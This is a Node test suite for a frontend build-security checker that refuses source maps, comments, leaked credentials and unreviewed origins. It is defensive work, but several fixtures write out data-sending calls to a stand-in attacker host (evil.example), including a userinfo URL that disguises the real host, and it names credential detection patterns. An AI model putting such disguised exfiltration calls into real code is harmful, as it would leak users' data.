import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { createRequire } from "node:module";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import test from "node:test";
import { fileURLToPath, pathToFileURL } from "node:url";
import { browserBuildComments, browserBuildFileName, browserBuildInventoryGaps, browserBuildMarkupComments,
  browserBuildOrigins, browserBuildResource, verifyBrowserBuild } from "./browser-build-policy.mjs";

const repository = join(dirname(fileURLToPath(import.meta.url)), "..");
const frontend = join(repository, "frontend");
const inventory = JSON.parse(readFileSync(join(repository, "security/published-web-resources.json"), "utf8"));
const inventorySchema = JSON.parse(readFileSync(
  join(repository, "security/published-web-resources.schema.json"), "utf8"));
const require = createRequire(new URL("../frontend/package.json", import.meta.url));
const Ajv = require("ajv/dist/2020").default;

test("given browser build paths from either platform, when reading their filename, then metadata names stay detectable", () => {
  assert.equal(browserBuildFileName("C:\\build\\public\\robots.txt"), "robots.txt");
  assert.equal(browserBuildFileName("/build/public/robots.txt"), "robots.txt");
  assert.equal(browserBuildResource("C:\\build\\public\\assets\\app.js", "C:\\build\\public"),
    "assets/app.js");
});

function temporaryBuild(context) {
  const builds = [];
  context.after(() => builds.forEach((directory) => rmSync(directory, { recursive: true, force: true })));
  return (files) => {
    const directory = browserBuild(files);
    builds.push(directory);
    return directory;
  };
}

function browserBuild(files = {}) {
  const directory = mkdtempSync(join(tmpdir(), "courtside-browser-build-"));
  for (const [name, content] of Object.entries({ "index.html": "<script src='/assets/app.js'></script>",
    "assets/app.js": "console.log('Courtside')", ...files })) {
    const path = join(directory, name);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, content);
  }
  return directory;
}

test("given a production browser build, when inspecting its files, then only inventoried resources ship", (context) => {
  // given
  const build = temporaryBuild(context);
  const clean = build();

  // when / then
  verifyBrowserBuild(clean);
  assert.throws(() => verifyBrowserBuild(build({ "assets/app.js.map": "{}" })), /source maps/);
  assert.throws(() => verifyBrowserBuild(build({
    "robots.txt": "Disallow: /admin"
  })), /unreviewed metadata resource/);
  assert.throws(() => verifyBrowserBuild(build({
    ".well-known/security.txt": "Contact: mailto:security@example.org"
  })), /unreviewed metadata resource/);
  assert.throws(() => verifyBrowserBuild(build({
    "release-environment.json": "{\"environment\":\"production\"}"
  })), /unreviewed public resource/);
  assert.throws(() => verifyBrowserBuild(build({
    "assets/app.mjs": "console.log('Courtside')"
  })), /unreviewed public resource/);
});

test("given every form an origin is written in, when the extractor reads it, then the host it names is the host a browser dials", () => {
  // given
  const corpus = [
    ["fetch('https://plain.example/a')", ["plain.example"]],
    ["fetch('HTTPS://UPPER.EXAMPLE/a')", ["upper.example"]],
    ["new WebSocket('wss://socket.example/s')", ["socket.example"]],
    ["fetch('https://reviewed.example@real.example/a')", ["real.example"]],
    ["fetch('https://reviewed.example:secret@real.example/a')", ["real.example"]],
    ["var l='https://first.example/a,https://second.example/b'", ["first.example", "second.example"]],
    ["var l='https://first.example/a;https://second.example/b'", ["first.example", "second.example"]],
    ["var l=['https://first.example/a','https://second.example/b']", ["first.example", "second.example"]],
    ["var l={a:'https://first.example/a',b:'https://second.example/b'}", ["first.example", "second.example"]],
    ["fetch(\"https:\\/\\/escaped.example\\/a\")", ["escaped.example"]],
    ["<script src=\"//relative.example/a.js\"></script>", ["relative.example"]],
    ["<script src=\"//reviewed.example@real.example/a.js\"></script>", ["real.example"]],
    ["<script src=\"//intranet/a.js\"></script>", ["intranet"]],
    ["<image href=\"&#47;&#47;entity.example/x.png\"/>", ["entity.example"]],
    ["<svg xmlns=\"http://www.w3.org/2000/svg\">", ["www.w3.org"]],
    ["var s='a//b'", []],
    ["const pattern=/\\/\\/*/", []],
    ["const ratio=6//2", []]
  ];

  // when / then
  for (const [source, expected] of corpus) {
    assert.deepEqual(browserBuildOrigins(source), expected,
      `the extractor reads ${source} as ${expected.join(", ") || "no origin"}`);
  }
});

test("given every form a comment is written in, when the extractor reads it, then nothing it hides stays unread", () => {
  // given
  const corpus = [
    ["<!-- plain -->", ["plain"]],
    ["<!-- bang --!>", ["bang"]],
    ["<!-->", [""]],
    ["<!--->", [""]],
    ["<p>a</p><!-- unterminated", ["unterminated"]],
    ["<!-- one --><!-- two -->", ["one", "two"]],
    ["<p>none</p>", []]
  ];

  // when / then
  for (const [source, expected] of corpus) {
    assert.deepEqual(browserBuildMarkupComments(source), expected,
      `the extractor reads ${source} as ${expected.length} comment(s)`);
  }
  assert.deepEqual(browserBuildComments("index.html",
    "<script type=\"application/json\">{\"a\":1}</script>"), [],
    "a data block is not JavaScript and no parser is asked to read it as such");
  assert.deepEqual(browserBuildComments("index.html",
    "<script type=\"module\">/* inlined */</script>"), ["inlined"]);
  assert.deepEqual(browserBuildComments("index.html", "<script>/* untyped */</script>"), ["untyped"]);
  assert.deepEqual(browserBuildComments("index.html", "<script>/* junk end tag */</script\tbar>"),
    ["junk end tag"], "a browser closes an end tag that carries whitespace or attributes, so this does");
  assert.deepEqual(browserBuildComments("index.html", "<style>/* junk end tag */</style bar>"),
    ["junk end tag"]);
});

test("given the published-web-resource inventory, when it is read, then its own schema still binds it", () => {
  // given
  const validate = new Ajv({ strict: true }).compile(inventorySchema);

  // when / then
  assert.ok(validate(inventory), JSON.stringify(validate.errors));
  assert.deepEqual(inventory.credentialPatterns.map(({ id }) => id),
    ["private-key-block", "aws-access-key-id", "github-personal-access-token"],
    "removing a credential class removes its own falsification with it, so the set is named here too");
  assert.deepEqual(inventory.disclosureMarkers.map(({ id }) => id),
    ["source-map-reference", "unfinished-work-marker", "build-host-path"]);
  assert.deepEqual(inventory.reviewedOrigins.map(({ host }) => host),
    ["www.w3.org", "react.dev", "reactrouter.com", "react.i18next.com", "bit.ly", "github.com",
      "scripts.sil.org", "localhost"],
    "a new reviewed origin is a decision, so it is named where the review can see it");
});

test("given the application's own resource root, when the packaged web root is assembled, then nothing else lands in it", () => {
  // given
  const applicationRoot = join(repository, "src/main/resources/static");

  // when / then
  assert.equal(existsSync(applicationRoot) && readdirSync(applicationRoot).length > 0, false,
    "a file here is served under the same permitted paths and the build policy never reads it");
});

test("given every declared credential and disclosure pattern, when its specimen ships, then the build is refused", (context) => {
  // given
  const build = temporaryBuild(context);
  const declared = [...inventory.credentialPatterns, ...inventory.disclosureMarkers];
  assert.ok(declared.length > 0);

  // when / then
  for (const { id, specimen } of declared) {
    assert.throws(() => verifyBrowserBuild(build({ "assets/planted.js": specimen })),
      new RegExp(`contains ${id} material in assets/planted.js`),
      `${id} no longer recognises the specimen its justification names`);
  }
});

test("given shipped markup, styles and scripts, when reading their comments, then an unreviewed one is refused", (context) => {
  // given
  const build = temporaryBuild(context);
  assert.deepEqual(inventory.reviewedComments, [],
    "the production build ships no comment, so every comment found is a new decision");

  // when / then
  assert.throws(() => verifyBrowserBuild(build({
    "assets/app.js": "/*! Courtside build 2026-09-10 */\nconsole.log('Courtside')"
  })), /unreviewed comment in assets\/app\.js/);
  assert.throws(() => verifyBrowserBuild(build({
    "assets/app.css": "/* staging override */\nbody { margin: 0 }"
  })), /unreviewed comment in assets\/app\.css/);
  assert.throws(() => verifyBrowserBuild(build({
    "index.html": "<!-- deployed from the release runner -->"
  })), /unreviewed comment in index\.html/);
  assert.throws(() => verifyBrowserBuild(build({
    "index.html": "<!-- deployed from the release runner --!>"
  })), /unreviewed comment in index\.html/, "the parser closes a comment on --!> as well");
  assert.throws(() => verifyBrowserBuild(build({ "index.html": "<!-->" })),
    /unreviewed comment in index\.html/);
  assert.throws(() => verifyBrowserBuild(build({
    "index.html": "<script>/* built on the release runner */</script>"
  })), /unreviewed comment in index\.html/, "an inlined script carries its comments into the document");
  assert.throws(() => verifyBrowserBuild(build({
    "index.html": "<style>/* staging override */</style>"
  })), /unreviewed comment in index\.html/);
  verifyBrowserBuild(build({ "assets/app.js": "const pattern = /\\/*/; console.log(pattern)" }));
});

test("given shipped resources, when reading the origins they name, then an unreviewed host is refused", (context) => {
  // given
  const build = temporaryBuild(context);
  const reviewed = inventory.reviewedOrigins.map(({ host }) => host);

  // when / then
  assert.throws(() => verifyBrowserBuild(build({
    "assets/app.js": "fetch('https://telemetry.example.invalid/collect')"
  })), /unreviewed origin telemetry\.example\.invalid in assets\/app\.js/);
  assert.throws(() => verifyBrowserBuild(build({
    "icon.svg": "<svg xmlns=\"http://www.w3.org.example.invalid/2000/svg\"></svg>"
  })), /unreviewed origin www\.w3\.org\.example\.invalid in icon\.svg/);
  assert.throws(() => verifyBrowserBuild(build({
    "assets/app.js": "fetch('https://github.com@evil.example/collect')"
  })), /unreviewed origin evil\.example/, "userinfo names the host the browser will not contact");
  assert.throws(() => verifyBrowserBuild(build({
    "assets/app.js": "fetch('HTTPS://EVIL.EXAMPLE/collect')"
  })), /unreviewed origin evil\.example/);
  assert.throws(() => verifyBrowserBuild(build({
    "assets/app.js": "new WebSocket('wss://evil.example/stream')"
  })), /unreviewed origin evil\.example/);
  assert.throws(() => verifyBrowserBuild(build({
    "index.html": "<script src=\"//evil.example/a.js\"></script>"
  })), /unreviewed origin evil\.example/);
  assert.deepEqual(browserBuildOrigins("<svg xmlns=\"http://www.w3.org/2000/svg\">"), ["www.w3.org"]);
  verifyBrowserBuild(build({
    "icon.svg": `<svg xmlns="http://${reviewed[0]}/2000/svg"></svg>`
  }));
});

test("given the packaged application, when reading how the web root reaches it, then the checked build is the packaged one", () => {
  // given
  const pom = readFileSync(join(repository, "pom.xml"), "utf8");
  const execution = pom.slice(pom.indexOf("<id>copy-web-client</id>"), pom.indexOf("</plugin>",
    pom.indexOf("<id>copy-web-client</id>")));

  // when / then
  assert.match(execution, /<outputDirectory>\$\{project\.build\.outputDirectory}\/static<\/outputDirectory>/);
  assert.match(execution, /<directory>\$\{project\.basedir}\/frontend\/dist<\/directory>/);
  assert.match(execution, /<filtering>false<\/filtering>/,
    "a filtered copy would put something into the image that the policy never read");
});

test("given production browser sources, when building the web root, then metadata and debug artifacts stay absent", async (context) => {
  // given
  const output = mkdtempSync(join(tmpdir(), "courtside-production-browser-build-"));
  context.after(() => rmSync(output, { recursive: true, force: true }));
  const vite = await import(pathToFileURL(join(frontend, "node_modules/vite/dist/node/index.js")).href);
  const loaded = await vite.loadConfigFromFile(
    { command: "build", mode: "production" }, join(frontend, "vite.config.ts"));
  assert.notEqual(loaded, null);

  // when
  await vite.build({ ...loaded.config, configFile: false, root: frontend, logLevel: "error",
    build: { ...loaded.config.build, outDir: output, emptyOutDir: true } });

  // then
  verifyBrowserBuild(output);
  assert.deepEqual(browserBuildInventoryGaps(output), [],
    "an entry the build no longer produces is a review the inventory still claims to have had");
  const shipped = readdirSync(output, { recursive: true, withFileTypes: true })
    .filter((entry) => entry.isFile())
    .map((entry) => `/${join(entry.parentPath, entry.name).slice(output.length + 1).replaceAll("\\\\", "/")}`);
  for (const declared of inventory.anonymousStaticPaths) {
    const expression = new RegExp(`^${declared.split("*").map((part) =>
      part.replaceAll(/[.*+?^${}()|[\]\\]/g, String.raw`\$&`)).join(".*")}$`);
    assert.ok(shipped.some((path) => expression.test(path)),
      `${declared} is permitted anonymously and the build produces nothing that matches it`);
  }
});
